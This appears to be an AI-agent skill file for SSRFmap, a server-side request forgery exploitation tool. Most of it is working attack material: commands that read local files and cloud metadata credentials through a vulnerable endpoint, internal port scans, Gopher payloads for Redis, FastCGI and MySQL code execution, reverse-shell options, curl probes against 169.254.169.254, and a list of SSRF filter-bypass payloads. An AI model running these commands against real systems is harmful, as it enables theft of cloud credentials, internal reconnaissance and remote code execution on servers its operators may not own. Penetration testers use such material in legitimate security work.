---
name: ssrfmap
description: "SSRFmap: automated SSRF (Server-Side Request Forgery) exploitation tool using Burp-style request files. Use when you have confirmed or suspected SSRF to read local files, enumerate internal ports, extract cloud metadata (AWS/GCP/Azure), or pivot to internal services (Redis, SMTP, memcached). Supports 10+ exploitation modules."
license: MIT
compatibility: "Linux / macOS / Windows. Python 3. git clone https://github.com/swisskyrepo/SSRFmap && pip3 install -r requirements.txt"
metadata:
  author: AeonDave
  version: "1.0"
---

# SSRFmap

Automated SSRF exploitation — local files, port scan, cloud metadata, internal service abuse.

## Quick Start

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap && pip3 install -r requirements.txt

# Basic: read /etc/passwd via SSRF
python3 ssrfmap.py -r request.txt -p url -m readfiles

# AWS metadata extraction
python3 ssrfmap.py -r request.txt -p url -m aws

# Internal port scan
python3 ssrfmap.py -r request.txt -p url -m portscan
```

## Request File Format

Save a Burp-captured request as `request.txt`:

```
POST /api/fetch HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{"url": "http://SSRF_URL"}
```

The `-p url` flag tells SSRFmap which parameter inside the body/query contains the injectable URL. Use `SSRF_URL` as a placeholder; the tool replaces it.

## Core Flags

| Flag | Purpose |
|------|---------|
| `-r <file>` | Burp-format request file |
| `-p <param>` | Parameter name containing the SSRF URL |
| `-m <module>` | Exploitation module(s) — comma-separated |
| `-l <level>` | Verbosity level 0-3 (default: 0) |
| `--lhost <ip>` | Local IP for reverse shells or callbacks |
| `--lport <port>` | Local port for reverse shells |
| `--proxy <url>` | Route requests through proxy |
| `--ssl` | Force HTTPS connection to target |
| `--uagent <ua>` | Custom User-Agent |
| `--waf` | Enable WAF bypass mode (double URL encoding) |

## Exploitation Modules

| Module | What It Does |
|--------|-------------|
| `readfiles` | Read local files via `file:///etc/passwd` |
| `portscan` | Scan internal ports (127.0.0.1 / RFC1918) |
| `aws` | Extract AWS EC2 metadata (`169.254.169.254`) |
| `gcp` | Extract GCP metadata (`metadata.google.internal`) |
| `azure` | Extract Azure IMDS metadata |
| `networkscan` | Ping sweep internal network |
| `redis` | Exploit Redis via Gopher to write files or get shell |
| `smtp` | Send email via internal SMTP (Gopher) |
| `fastcgi` | PHP-FPM FastCGI RCE (Gopher) |
| `mysql` | MySQL query via Gopher |
| `docker` | Docker API enumeration |
| `zabbix` | Zabbix API exploitation |

## Multi-Module Run

```bash
# Enumerate everything in one pass
python3 ssrfmap.py -r request.txt -p url \
    -m aws,readfiles,portscan -l 2
```

## Manual SSRF Verification First

Confirm SSRF exists before running SSRFmap:

```bash
# 1. Start listener
python3 -m http.server 8000

# 2. Send request with callback to your IP
# If you see a request in the listener → SSRF confirmed

# 3. Test file read manually
curl "https://target.com/api?url=file:///etc/passwd"

# 4. Test cloud metadata (AWS)
curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/"
```

## SSRF Bypass Techniques

```
# IP representation variants
http://2130706433/         # 127.0.0.1 as decimal
http://0x7f000001/         # 127.0.0.1 as hex
http://0177.0.0.1/         # 127.0.0.1 as octal
http://[::1]/              # IPv6 loopback
http://[::ffff:127.0.0.1]/ # IPv4-mapped IPv6

# DNS tricks
http://localtest.me/        # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/  # DNS rebinding

# URL obfuscation
http://target.com@127.0.0.1/   # @ trick
http://127.0.0.1#target.com    # Fragment
http://127.0.0.1/.target.com/  # Path confusion

# Protocol handlers
gopher://127.0.0.1:6379/_FLUSH%0D%0A   # Redis via gopher
dict://127.0.0.1:6379/info              # Redis via dict
```

## Gopherus (Complementary Tool)

For generating Gopher payloads targeting internal services:

```bash
pip3 install gopherus
gopherus --exploit redis        # Redis RCE
gopherus --exploit mysql        # MySQL query injection
gopherus --exploit fastcgi      # PHP-FPM RCE
gopherus --exploit postgresql   # PostgreSQL
```

## References

- [SSRFmap GitHub](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus GitHub](https://github.com/tarunkant/Gopherus)
- SSRF bypass payloads: `references/ssrf-bypass.md`
